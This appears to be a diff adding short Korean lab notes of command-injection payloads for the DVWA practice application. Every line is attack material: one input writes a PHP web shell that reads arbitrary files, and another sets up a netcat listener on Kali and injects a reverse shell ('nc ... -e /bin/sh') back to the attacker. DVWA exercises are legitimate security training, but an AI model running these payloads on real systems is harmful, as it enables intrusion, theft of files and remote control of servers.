@@ -1,0 +1,10 @@
+1번째 코드 (DVWA 창에 입력할 것)
+8.8.8.8; echo """<?php
+\$file=\$_GET[\"filename\"];
+system(\"cat \$file\");
+?>""" > cat.php;
+
+2번째 코드
+1. Kali cmd창에 입력할 것 : nc -lvp [포트번호]
+2. DVWA에 입력할 것 : 127.0.0.1 && nc [Kali의 IP주소] [포트번호] -e /bin/sh
+
